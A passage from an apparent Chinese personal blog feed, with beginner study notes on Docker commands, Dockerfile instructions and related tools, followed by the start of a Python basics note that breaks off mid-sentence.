punctuation">,</span>  <span class="token property">"experimental"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span></code></pre><p><strong>腾讯云换阿里云的源</strong></p><p><code>sudo vim /etc/apt/sources.list</code> G 到文件底部 <code>:1.,d</code> 删除所有 复制下面的内容,wq退出</p><p>更新一下apt-get</p><pre class=" language-bash"><code class="language-bash">deb http://mirrors.aliyuncs.com/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.aliyuncs.com/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.aliyuncs.com/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.aliyuncs.com/ubuntu/ xenial-proposed main restricted universe multiversedeb http://mirrors.aliyuncs.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial-security main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial-updates main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial-proposed main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial-backports main restricted universe multiverse</code></pre><h1 id="Docker-使用"><a href="#Docker-使用" class="headerlink" title="Docker 使用"></a>Docker 使用</h1><p>Docker 允许在容器内允许应用程序,使用<code>docker run</code> 命令在容器内允许一个应用程序</p><pre><code>docker run ubuntu:15.10 /bin/echo &quot;Hello world&quot;</code></pre><ul><li>docker: Docker 的二进制执行文件</li><li>run: 与前面的docker 组合运行一个容器</li><li>ubuntu:15.10 指定运行的镜像</li><li>/bin/echo “Hello world” 在容器里执行的命令</li></ul><p><strong>运行交互式的容器</strong></p><p><code>-i -t</code> 参数</p><p><strong>-t:</strong> 在新容器内指定一个伪终端或终端</p><p><strong>-i:</strong> 允许你对容器内的标准输入 (STDIN) 进行交互</p><p>可以使用 exit 命令 或者使用 CTRL-D 退出容器 , 返回到当前的主机中</p><pre><code>docker run -d ubuntu:15.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</code></pre><p>这行命令将返回一个 容器 ID , 每个容器的ID 都是唯一的<code>44a24ceb189833ce6ef36e71ed98246400a61405786134a702fa7fd9de7e431c</code></p><p>通过<code>docker ps</code> 命令 来确认是否有容器在运行</p><p>输出的内容详情: </p><p><strong>CONTAINER ID:</strong> 容器 ID。我的就是 <code>44a24ceb1898</code></p><p><strong>IMAGE:</strong> 使用的镜像。</p><p><strong>COMMAND:</strong> 启动容器时运行的命令。</p><p><strong>CREATED:</strong> 容器的创建时间。</p><p><strong>STATUS:</strong> 容器状态。状态有7中,对应的意思和英文翻译成中文是一样的</p><p><strong>PORTS:</strong> 容器的端口信息和使用的连接类型（tcp\udp）。</p><p><strong>NAMES:</strong> 自动分配的容器名称。</p><p><strong>停止容器:</strong> </p><p><code>sudo docker stop 44a24ceb1898</code></p><p>使用后,可以使用<code>sudo docker ps</code> 来查看是否关闭</p><hr><h2 id="Docker-客户端"><a href="#Docker-客户端" class="headerlink" title="Docker 客户端"></a><strong>Docker 客户端</strong></h2><p>直接在终端中输入<code>docker</code> 就可以查看所有命令选项</p><p>可以看到<code>Usage:  docker [OPTIONS] COMMAND</code> </p><pre><code>Options:      --config string      Location of client config files (default &quot;/home/ubuntu/.docker&quot;)  -D, --debug              Enable debug mode  -H, --host list          Daemon socket(s) to connect to  -l, --log-level string   Set the logging level (&quot;debug&quot;|&quot;info&quot;|&quot;warn&quot;|&quot;error&quot;|&quot;fatal&quot;) (default &quot;info&quot;)      --tls                Use TLS; implied by --tlsverify      --tlscacert string   Trust certs signed only by this CA (default &quot;/home/ubuntu/.docker/ca.pem&quot;)      --tlscert string     Path to TLS certificate file (default &quot;/home/ubuntu/.docker/cert.pem&quot;)      --tlskey string      Path to TLS key file (default &quot;/home/ubuntu/.docker/key.pem&quot;)      --tlsverify          Use TLS and verify the remote  -v, --version            Print version information and quit</code></pre><p>查看命令帮助指南和Linux 命令一样,用 –help 即可</p><p><code>sudo docker ps -a</code> 查看所有容器,包括停止的</p><h2 id="容器使用"><a href="#容器使用" class="headerlink" title="容器使用"></a>容器使用</h2><p><strong>获取镜像</strong></p><p>本地如果没有 Ubuntu镜像,使用<code>sudo docker pull ubuntu</code> 命令来载入 Ubuntu镜像</p><p><strong>启动容器</strong></p><p><code>sudo docker run -it ubuntu /bin/bash</code></p><p>这些参数,上面也学习了,这里就列一点就行</p><blockquote><p><strong>/bin/bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash</p></blockquote><p>退出终端, 输入<code>exit</code> 即可</p><p><strong>启动已停止运行的容器</strong></p><p>查看所有容器 <code>docker ps -a</code></p><p><code>docker start + 容器ID</code> 启动一个已经停止的容器</p><p><strong>后台运行</strong></p><blockquote><p>在run后的参数 加上<code>-d</code> 就可以指定容器的运行模式,参数默认不进入容器</p></blockquote><p><strong>停止一个容器</strong></p><p><code>docker stop + 容器ID</code></p><p>停止的容器可以通过 <code>docker restart + 容器ID</code> 重启</p><p><strong>进入容器</strong></p><p>在使用了<code>-d</code>参数是,容器启动后会进入后台. 进入容器可以通过</p><ul><li>docker attach</li><li>docker exec (教程说推荐使用,因为推出容器终端不会导致容器的停止)</li></ul><p><strong>导入和导出容器</strong></p><ul><li><p>导出本地某个容器</p><p>使用<code>docker export+容器ID &gt; 要导入的本地文件名</code></p></li><li><p>导入容器快照</p><p><code>docker import</code> 即<code>docker/本地文件名 | docker import - 镜像名</code></p></li></ul><p>也可以通过 URL来导入<code>docker import http://example.com/....</code></p><p><strong>删除容器</strong></p><p>使用<code>docker rm</code> 命令. </p><p><code>docker rm -f +容器ID</code></p><p>使用<code>docker container prune</code> 清理掉所有处于终止状态的容器</p><p><strong>运行一个 Web 应用</strong></p><p>即在docker 容器中运行一个 Python Flask 应用来运行 web应用</p><p><code>sudo docker pull training/webapp</code> 载入镜像</p><p><code>sudo docker run -d -P training/webapp python app.p</code> </p><blockquote><p><code>-d</code> 让容器在后台运行, <code>-P</code> 让容器内部使用的网络端口映射到我们的使用的主机上</p></blockquote><p><code>0.0.0.0:32768-&gt;5000/tcp</code> docker 开放了 5000 端口( 默认的 Flask 端口 ) 映射到主机端口 32769 上,然后访问我的VPS的IP + 映射的端口后后,就可以看到这个Web 应用是成功了   </p><p><img src="https://i.loli.net/2020/02/10/4GLXzod3JuVcqNb.png" alt></p><p>可以通过 参数 <code>-p</code> 来设置不同的端口</p><p><img src="https://i.loli.net/2020/02/10/wfEBsb3e8oDr6ld.png" alt></p><p><img src="https://i.loli.net/2020/02/10/sMtSrLXIHZeodc9.png" alt></p><p><strong>网络端口的快捷方式</strong></p><p><code>docker port + 容器ID(或名字)</code> 可以查看指定ID(或名字)的容器的确定端口映射到宿主机的端口号</p><pre><code>ubuntu@VM-0-15-ubuntu:~$ sudo docker port gifted_darwin5000/tcp -&gt; 0.0.0.0:32768</code></pre><p><strong>查看 Web 应用程序日志</strong></p><p><code>docker logs + 容器ID或者名字</code></p><p><code>-f</code> 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出</p><p><strong>查看 Web 应用程序容器的进程</strong></p><p><code>docker top</code> 命令查看容器内部运行的进程</p><p><strong>检查 Web 应用程序</strong></p><p><code>docker inspect</code> 查看Docker 的底层信息,返回 JSON 文件记录容器的配置和状态信息</p><p><strong>停止,重启,移除 Web 应用容器</strong></p><ul><li><code>docker stop + 容器名字</code>(或者ID)</li><li><code>docker start + 容器名字</code>(或者ID)(重启已停止的容器) <code>docker restart</code> 重启运行中的</li><li><code>docker rm +容器名字</code>(或者ID) 删除不需要的容器,容器必须是停止状态</li></ul><p><code>docker ps -l</code> 查看最后一次创建的容器</p><h2 id="镜像使用"><a href="#镜像使用" class="headerlink" title="镜像使用"></a>镜像使用</h2><p>如果运行容器时, 镜像在本地中不存在, docker 就会自动从 docker 镜像仓库中下载,默认从 Docker hub</p><p><strong>列出镜像列表</strong></p><p><code>docker images</code> 列出本机上的镜像</p><ul><li><strong>REPOSITORY：</strong>表示镜像的仓库源</li><li><strong>TAG：</strong>镜像的标签( 同一个仓库源可以有多个 TAG, 代表仓库源的不同版本 ),如果在运行容器时,不指定版本,默认latest</li><li><strong>IMAGE ID：</strong>镜像ID</li><li><strong>CREATED：</strong>镜像创建时间</li><li><strong>SIZE：</strong>镜像大小</li></ul><p><strong>获取一个新的镜像</strong></p><p><code>docker pull</code>命令 来预先下载镜像</p><p><strong>查找镜像</strong></p><ul><li>可以在 Dokcer Hub 上搜索镜像 <a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a></li><li>使用 <code>docker search</code> 命令来搜索镜像</li></ul><p><strong>拖取镜像</strong></p><p><code>docker pull</code></p><p><strong>删除镜像</strong></p><p><code>docker rmi + 容器名字或ID</code> 我这里用 rmi 会报错, 要force,但是kill 又没有运行中,反而直接使用 rm 可以成功</p><p>看了看 rm 和 rmi 的区别</p><ul><li>rm : 删除一个或多个<strong>容器</strong></li><li>rmi: 删除一个或多个<strong>镜像</strong></li><li>prune: 删除不再使用的docker <strong>对象</strong></li></ul><p><strong>创建镜像</strong></p><p>有两种方式可以对镜像进行更改</p><ul><li>从已经创建的容器中更新镜像,然后提交这个镜像</li><li>使用 Dockerfile 指令来创建一个新的镜像</li></ul><p>在运行的镜像中, 使用<code>apt-get update</code> 来更新镜像 <code>exit</code> 退出</p><p><code>docker commit</code> 来提交容器副本</p><pre><code>ubuntu@VM-0-15-ubuntu:~$ sudo docker commit -m=&quot;has update&quot; -a=&quot;IFONLY&quot; f8766b35560d IFONLY/ubuntu:v2invalid reference format: repository name must be lowercaseubuntu@VM-0-15-ubuntu:~$ sudo docker commit -m=&quot;has update&quot; -a=&quot;IFONLY&quot; f8766b35560d ifonly/ubuntu:v2sha256:7d76c68f5309c2944e95cca81844c245fa309e953570152c180b3e92c4c2ddde</code></pre><ul><li><strong>-m:</strong> 提交的描述信息</li><li><strong>-a:</strong> 指定镜像作者</li><li><strong>e218edb10161：</strong>容器 ID</li><li><strong>runoob/ubuntu:v2:</strong> 指定要创建的目标镜像名</li></ul><p>然后就可以用我们创建的新镜像来启动一个容器</p><p><code>sudo docker run -t -i ifonly/ubuntu:v2 /bin/bash</code></p><p><strong>构建镜像</strong></p><p><code>docker build</code> 创建一个新的镜像,需要一个 Dockerfile 文件</p><p><code>docker build -t 用户名/镜像源 .</code></p><ul><li>-t : 指定要创建的目标镜像名</li><li>. : Dockerfile 文件所在目录, 也可指定绝对路径</li></ul><p><strong>设置镜像标签</strong></p><p><code>docker tag</code>命令,为镜像添加一个新的标签.</p><p>使用格式: </p><p><code>docker tag 镜像ID 用户名称/镜像源名(repository name) : 新的标签名(tag)</code></p><h2 id="容器连接"><a href="#容器连接" class="headerlink" title="容器连接"></a>容器连接</h2><p>前面也学习了,通过网络端口,映射技术来实现访问运行在 docker 容器内的服务</p><p><code>-P</code> 或 <code>-p</code> 参数来指定端口映射</p><p><strong>网络端口映射</strong></p><ul><li><strong>-P :</strong>是容器内部端口<strong>随机</strong>映射到主机的高端口</li><li><strong>-p :</strong> 是容器内部端口绑定到<strong>指定</strong>的主机端口</li></ul><p><code>docker run -d -p 127.0.0.1:5001:5000 training/webapp python app.py</code></p><p>指定容器绑定的网络地址,比如绑定到本地</p><p>不过, 这些都是默认绑定tcp端口,如果要绑定 UDP 端口, 可以在<strong>端口后面加上 /udp</strong></p><p><strong>Docker 容器互联</strong></p><p>端口映射并不是唯一把 docker 连接到另一个容器的方法</p><blockquote><p>docker 有一个连接系统允许将多个容器连接在一起，共享连接信息</p><p>docker 连接会创建一个父子关系，其中父容器可以看到子容器的信息</p></blockquote><p><strong>容器命名</strong></p><p>创建容器时, docker 会自动进行命名,可以使用<code>--name</code> 标识来命名容器</p><p><code>sudo docker run -d -p 4399:5000 --name ifonly training/webapp python app.py</code></p><p><strong>新建网络</strong></p><p><code>docker network create -d bridge + name</code></p><p><strong>-d</strong>：参数指定 Docker 网络类型，有 bridge、overlay。</p><p>使用<code>docker network ls</code> 可以列出当前的网络</p><p><strong>连接容器</strong></p><p>运行一个容器并连接到新建的 text-net</p><p><code>docker run -itd --name test1 --network test-net ubuntu /bin/bash</code></p><p>同样的方法再运行一个 test2</p><p>在test1容器中 <code>docker exec -it test1 /bin/bash</code> 执行一个交互式环境,然后ping test2</p><p>安装ping <code>apt-get update</code> <code>apt install iputils-ping</code></p><p>然后发现可以ping 通 ,就说明是成功连接了 从 test2 中 ping test1 也是成功的,说明 这两个容器已经建立了互联关系</p><p><strong>配置 DNS</strong></p><p>在宿主机的 <code>/etc/docker/daemon.json</code> 文件中增加以下内容来设置全部容器的 DNS</p><pre><code>{  &quot;dns&quot; : [    &quot;114.114.114.114&quot;,    &quot;8.8.8.8&quot;  ]}</code></pre><p>因为这个文件是 readonly 的, 所以使用 sudo 就可以了.设置后,需要重启 docker 才能生效</p><p><code>docker run -it --rm host_ubuntu  --dns=114.114.114.114 --dns-search=test.com ubuntu</code></p><ul><li><strong>-h HOSTNAME 或者 –hostname=HOSTNAME</strong>： 设定容器的主机名，它会被写到容器内的 /etc/hostname 和 /etc/hosts</li><li><strong>–dns=IP_ADDRESS</strong>： 添加 DNS 服务器到容器的 /etc/resolv.conf 中，让容器用这个服务器来解析所有不在 /etc/hosts 中的主机名</li><li><strong>–dns-search=DOMAIN</strong>： 设定容器的搜索域，当设定搜索域为 .example.com 时，在搜索一个名为 host 的主机时，DNS 不仅搜索 host，还会搜索 host.example.com</li></ul><h2 id="仓库管理"><a href="#仓库管理" class="headerlink" title="仓库管理"></a>仓库管理</h2><p>仓库( Repository ) 是集中存放镜像的地方.</p><p>Dokcer Hub 是Docker 官方维护的公共仓库 <a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a></p><p><strong>登录和登出,拉取镜像</strong></p><p><code>docker login</code> 和 <code>docker logout</code> </p><p>登录成功后就可以<code>docker search + 名字</code> 搜索要用的容器,然后<code>docker pull + 名字</code></p><p><strong>推送镜像</strong></p><p><code>docker push</code>  </p><p>因为推送镜像,必须使我们本地的镜像的名称和Docker 账户的名称相同,push前需要tag 本地的镜像</p><p><code>docker tag xxx username/xxx</code> </p><p><code>docker push username/xxx</code></p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了<strong>一条条构建镜像所需的指令和说明</strong></p><p><strong>用Docker 定制镜像</strong></p><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx</p><p><strong>RUN</strong>：用于执行后面跟着的命令行命令</p><ul><li>shell 格式: </li></ul><p>RUN &lt;命令行参数&gt; 即在终端操作的shell命令</p><ul><li>exec 格式: </li></ul><p>RUN [“可执行文件”, “参数1”, “参数2”]</p><pre><code>RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</code></pre><p><strong>注意</strong>：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大</p><p>可以使用续行符<code>\</code> 和<code>&amp;&amp;</code> 来连续一条指令,这样就只会创建一层</p><p><strong>开始构建镜像</strong></p><p>在 Dockerfile 文件的存放目录下,执行构建动作</p><p>我按照教程的来, 在目录下的 Dockerfile 构建一个 nginx:test( <strong>镜像名称:镜像标签</strong> )</p><pre><code>ubuntu@VM-0-15-ubuntu:~/Dockerfile$ sudo docker build -t nginx:test .Sending build context to Docker daemon  2.048kBStep 1/2 : FROM nginxlatest: Pulling from library/nginxbc51dd8edc1b: Already exists 66ba67045f57: Pull complete bf317aa10aa5: Pull complete Digest: sha256:ad5552c786f128e389a0263104ae39f3d3c7895579d45ae716f528185b36bc6fStatus: Downloaded newer image for nginx:latest ---&gt; 2073e0bcb60eStep 2/2 : RUN echo &#39;this is a locally image&#39; &gt; /usr/share/nginx/html/index.html ---&gt; Running in d466687eba61Removing intermediate container d466687eba61 ---&gt; dd822a81687aSuccessfully built dd822a81687aSuccessfully tagged nginx:test</code></pre><p><strong>上下文路径</strong></p><p>指令最后的那个 <code>.</code> 指的就是上下文路径</p><blockquote><p>上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</p></blockquote><p>如果未说明最后一个参数, 那么就默认上下文路径为 Dockerfile 所在的路径</p><p>另外, 上下文路径不要放无用的文件,这样会使过程变慢</p><p><strong>COPY</strong></p><p>复制指令,从上下文目录中复制文件或者目录到容器里指定路径</p><pre><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,...  &quot;&lt;目标路径&gt;&quot;]</code></pre><p><strong>[–chown=:]</strong>：可选参数，用户改变复制到容器内文件的拥有者和属组</p><p><strong>&lt;源路径&gt;</strong>：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则</p><p><strong>CMD</strong></p><p>类似于 RUN 指令,用于运行程序</p><ul><li>CMD 用于在 docker run</li><li>RUN 用于在 docker build</li></ul><p>如果Dockerfile 中有多个 CMD指令,只有最后一个生效</p><pre><code>CMD [&quot;&lt;可执行文件或命令&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...] </code></pre><p><strong>ENTRYPOINT</strong></p><p>与 CMD 类似,但是不会被 docker run 的命令行参数指定的指令所覆盖</p><pre><code>ENTRYPOINT [&quot;&lt;executeable&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...]</code></pre><p>可以和CMD 一起使用,但是二者就存在区别了</p><pre><code>FROM nginxENTRYPOINT [&quot;nginx&quot;, &quot;-c&quot;] # 定参CMD [&quot;/etc/nginx/nginx.conf&quot;] # 变参 </code></pre><p><strong>ENV</strong></p><p>设置环境变量, 定义了环境变量,在后续的指令中,就可以使用这个环境变量</p><pre><code>ENV &lt;key&gt; &lt;value&gt;ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></pre><p><strong>ARG</strong></p><p>构建参数, 与 ENV 作用一样, 只是作用域不一样,<strong>ARG 设置的环境变量值对 Dockerfile 内有效</strong>,构建好的镜像内不存在这个环境变量</p><pre><code>ARG &lt;参数名&gt;[=&lt;默认值&gt;]</code></pre><p><strong>VOLUME</strong></p><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷</p><p>匿名数据卷的作用: </p><ul><li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li><li>避免容器不断变大。</li></ul><pre><code>VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]VOLUME &lt;路径&gt;</code></pre><p><strong>EXPOSE</strong></p><p>作用就是用来声明端口</p><ul><li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射</li><li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口</li></ul><pre><code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code></pre><p><strong>WORKDIR</strong></p><p>指定工作目录,用 WORKDIR 指定的工作目录,会在构建镜像的每一层中都存在.(必须提前创建好)</p><pre><code>WORKDIR &lt;工作目录路径&gt;</code></pre><p><strong>USER</strong></p><p>用于指定执行后续命令的用户和用户组( 必须提前创建好 )</p><pre><code>USER &lt;用户名&gt;[:&lt;用户组&gt;]</code></pre><p><strong>HEALTHCHECK</strong></p><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态</p><p><strong>ONBUILD</strong></p><p>用于延迟构建命令的执行</p><hr><h2 id="Compose"><a href="#Compose" class="headerlink" title="Compose"></a>Compose</h2><p><a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">https://github.com/docker/compose/releases</a></p><p>Compose 是用于<strong>定义和运行多容器 Docker</strong> 应用程序的工具 , 使用 Compose 的三个步骤</p><ul><li>使用 Dockerfile 定义应用程序的环境</li><li>使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行</li><li>最后，执行 docker-compose up 命令来启动并运行整个应用程序</li></ul><p>更多的需要 看这个 <a href="https://www.runoob.com/docker/docker-compose.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-compose.html</a> </p><p>不一一 Ctrl+C/V了</p><h2 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a>Machine</h2><p>安装</p><pre><code>base=https://github.com/docker/machine/releases/download/v0.16.0 &amp;&amp;  curl -L $base/docker-machine-$(uname -s)-$(uname -m) &gt;/tmp/docker-machine &amp;&amp;  sudo mv /tmp/docker-machine /usr/local/bin/docker-machine &amp;&amp;  chmod +x /usr/local/bin/docker-machine</code></pre><p>Docker Machine 是一种可以在虚拟主机上安装 Docker 的工具，并可以使用 docker-machine 命令来管理主机</p><p><a href="https://www.runoob.com/docker/docker-machine.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-machine.html</a></p><h2 id="Swarm-集群管理"><a href="#Swarm-集群管理" class="headerlink" title="Swarm 集群管理"></a>Swarm 集群管理</h2><p>Docker Swarm 是 Docker 的集群管理工具。它将 Docker 主机池转变为单个虚拟 Docker 主机。 Docker Swarm 提供了标准的 Docker API，所有任何已经与 Docker 守护程序通信的工具都可以使用 Swarm 轻松地扩展到多个主机</p><p>支持的工具有: </p><ul><li>Dokku</li><li>Docker Compose</li><li>Docker Machine</li><li>Jenkins</li></ul><p>swarm 集群管理 由管理节点 和 工作节点构成<img src="https://www.runoob.com/wp-content/uploads/2019/11/services-diagram.png" alt></p><p><a href="https://www.runoob.com/docker/docker-swarm.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-swarm.html</a></p><h1 id="Dokcer-实例"><a href="#Dokcer-实例" class="headerlink" title="Dokcer 实例"></a>Dokcer 实例</h1><h2 id="Docker-安装-ubuntu"><a href="#Docker-安装-ubuntu" class="headerlink" title="Docker 安装 ubuntu"></a>Docker 安装 ubuntu</h2><p>前面的学习中就是以这个为例子的,不多介绍了</p><ul><li>sudo docker run -itd –name ubuntu-test ubuntu</li><li>sudo docker exec -it ubuntu-test /bin/bash</li></ul><h2 id="Docker-安装-CentOS"><a href="#Docker-安装-CentOS" class="headerlink" title="Docker 安装 CentOS"></a>Docker 安装 CentOS</h2><p>和安装 ubuntu 差不多</p><p>参考 <a href="https://www.runoob.com/docker/docker-install-centos.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-install-centos.html</a> </p><h2 id="Docker-安装Nginx"><a href="#Docker-安装Nginx" class="headerlink" title="Docker 安装Nginx"></a>Docker 安装Nginx</h2><p>PHP , MYSQL,</p><p>等….</p><p>这个我感觉需要环境的时候直接找到教程输入命令就行了 0.0</p><p><strong>“If you really believe in what you’re doing, work hard, take nothing personally and if something blocks one route, find another. Never give up.”</strong></p><p>​              </p>]]></content>
      
      
      <categories>
          
          <category> 容器技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python_Basic_Learning_Note</title>
      <link href="/posts/20200209/"/>
      <url>/posts/20200209/</url>
      
        <content type="html"><![CDATA[<h1 id="第一部分-Python编程基础"><a href="#第一部分-Python编程基础" class="headerlink" title="第一部分: Python编程基础"></a>第一部分: Python编程基础</h1><h1 id="0x01-Python基础"><a href="#0x01-Python基础" class="headerlink" title="0x01    Python基础"></a>0x01    Python基础</h1><p>Python 的<strong>数学操作符</strong></p><ul><li><code>**</code> 指数运算</li><li><code>%</code> 取模/取余运算</li><li><code>//</code> 整除/商数取整</li><li><code>/</code> <code>*</code> <code>-</code> <code>+</code> 当然就是”加减乘除”咯</li></ul><p>其中,<code>优先级</code>与数学中的运算优先级类似,优先级排名<code>**</code>然后是<code>*,/,//,%</code>,最后是<code>+ -</code> ,从左到右</p><p><strong>数据类型</strong></p><p>数据类型和C中差不多,有<code>整型,浮点型和字符串数据类型</code>,其中<code>表达式</code>是<code>值和操作符</code>的组合可以通过求值称为单个值.”数据类型”是一类值,每个值都只属于一种<code>数据类型</code></p><p>整型(int),也就是整数;浮点型(float),就是带有小数点;字符串(strs),就是有单引号或双引号中的,比如<code>&#39;aaa&#39;</code> </p><p>程序中的文本值,就是字符串,总是用单引号扩住</p><p>字符串连接使用<code>+</code>,这与数学运算中的<code>+</code>可以一样理解,只不过字符串需要用单引号括住</p><p><code>值</code>我们都是存入在变量中,当然除<code>1+1</code>这种直接的运算或者<code>&#39;if&#39;+&#39;only&#39;</code> 不需要,但是非要这样做也不是不行.</p><p><strong>赋值语句</strong>,几乎所有的编程语言,通过<code>=</code>来对变量进行<strong>赋值</strong>,</p><p>赋值语句,包含一个<strong>变量名</strong>,一个等号,一个值,比如<code>a = 666</code>的意思就是将6这个值赋给变量a,变量a就保存了6这个值,就是这么简单.第一次给变量赋值了后,这个变量就相当于被<strong>初始化或者创建</strong>,以后就可以使用这个变量,从而获取变量的值,但是如果变量又得到了一个新值,那么之前的那个值就没有了</p><p>变量名,只能是字母,数字,下划线,不能以数字开头,不能空格,以及其他的特殊符号,区分大小写,在Python中变量用小写是惯例</p><p>在Python中,使用<code>#</code>来对程序进行一些注释</p><p><code>str()</code>函数,求出传入值的字符串形式,<code>int()</code> 求整,<code>float</code>求浮点数,<code>input()</code>函数返回值为字符串形式,<code>len()</code>求字符串长度</p><blockquote><p>数字的字符串与整型和浮点型完全不同,但是整型值可以和浮点值相等</p></blockquote><p><code>round()</code>函数在py2和py3中的差异</p><p><img src="https://i.loli.net/2020/02/05/RbJCFEAXeusIQ4i.png" alt></p><p><img src="https://i.loli.net/2020/02/05/GYdnRSs6EuObWkA.png" alt></p><p>在py2中,进行四舍六入,如果距离两端一样远,则保留到离0远的一边,.</p><p>在py3中,如果距离两边一样远,保留到偶数的一边.</p><p><a href="https://www.runoob.com/w3cnote/python-round-func-note.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/python-round-func-note.html</a></p><h1 id="0x02-控制流"><a href="#0x02-控制流" class="headerlink" title="0x02    控制流"></a>0x02    控制流</h1><p><strong>布尔值</strong></p><p>布尔值只有两种,<code>True</code> 和<code>False</code>.这两个值不能作为变量名,因为这属于保留关键字</p><p><strong>比较操作符</strong></p><p>比较两个值,返回的值为布尔值</p><table><thead><tr><th>==</th><th>等于</th></tr></thead><tbody><tr><td>!=</td><td>不等于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;=</td><td>小于等于</td></tr><tr><td>&gt;=</td><td>大于等于</td></tr></tbody></table><p><code>==</code> 和<code>!=</code> 适用于所有的数据类型,整数和浮点型的值永远不会和字符串类型相等</p><p><strong>布尔操作符</strong></p><p><code>and</code> 和 <code>or</code>  操作符只接受两个布尔值(或表达式),被认为是”二元”操作符</p><p><code>and</code>操作符有假(False)则假,<code>or</code>操作符有真(True)则真</p><p><strong>not 操作符</strong></p><p>not 操作符只作用于一个布尔值(或表达式),求的<strong>值为相反的布尔值</strong></p><p><strong>混合布尔和比较操作符</strong></p><p>计算机先求 左边的表达式的值,然后再求右边的</p><p>布尔操作符的优先级<code>not</code> , <code>and</code> ,<code>or</code> 从左到右优先级递减</p><p><strong>条件</strong></p><p>布尔表达式可以看成是条件,求值总为布尔值.</p><p><strong>代码块</strong></p><ol><li>缩进增加时，代码块开始</li><li>代码块可以包含其他代码块</li><li>缩进减少为零，或减少为外面包围代码块的缩进，代码块就结束了</li></ol><hr><p><code>if</code>语句</p><p>if语句的子句,语句的条件为True时执行,为False,子句跳过</p><p>if语句包含,if关键字,条件,冒号<code>:</code>,在下一行开始,缩进的代码块(if子句)</p><p><code>else</code>语句</p><p>if 子句后面可以跟着 else语句,只有if 语句的条件为<code>False</code>时, else子句才会执行</p><p>else 语句包含, else 关键字, 冒号<code>:</code> ,下一行的开始,缩进的代码块(称为 else子句)</p><p><code>elif</code> 语句</p><p>elif 语句是”否则如果” ,总数跟着 if 或另一条elif语句后面.只有当<strong>前面的条件</strong>为<code>False</code>时才检查该条件</p><p>elif 语句包含以下部分,elif 关键字,条件(布尔表达式),冒号<code>:</code>,在下一行开始,缩进的代码块</p><p>还可以在elif 语句后加 else 子句,<strong>当 if  elif 语句中的条件都会False,就执行else子句</strong></p><p><code>while</code> 循环语句</p><p>如果条件为True,那么 while 语句就会一直执行.while 语句总包含</p><ul><li>关键字</li><li>条件(布尔表达式)</li><li>冒号<code>:</code></li><li>从新行开始,缩进的代码块(while 子句)</li></ul><p><code>break</code> 语句,使用 break 语句来跳出 while 循环</p><p><code>continue</code> 语句, 用于循环内部,如果程序执行遇到 continue 语句,则跳回到 循环开始出,重新对循环条件求值</p><p>如果执行了无限循环,那么可以使用<code>Ctrl+C</code> 向程序发送一个KeyboardInterrupt错误,导致即可停止</p><p><strong>for 循环 和 range()函数</strong></p><p>让代码执行固定次数,就可以使用上面二者来实现</p><p>“类真” 和 “类假” 的值</p><p><code>0</code> <code>0.0</code> 和<code>&#39;&#39;</code>(空字符串) 被认为是<code>False</code>,其他值则是<code>True</code></p><p>for 语句</p><ul><li>for 关键字</li><li>一个变量名,一般设置为i</li><li>in 关键字</li><li>调用 range()方法,最大传入3个参数</li><li>冒号<code>:</code></li><li>从下一行开始,缩进的代码块(称为for子句)</li></ul><p><code>range()</code>函数的第三个参数代表步长,即每两个数之间的间隔.也可以用负数,让循环技术逐渐减少</p><p><strong>导入模块</strong></p><p>Python 程序可以调用一组基本的函数,称为”内建函数”.比如: 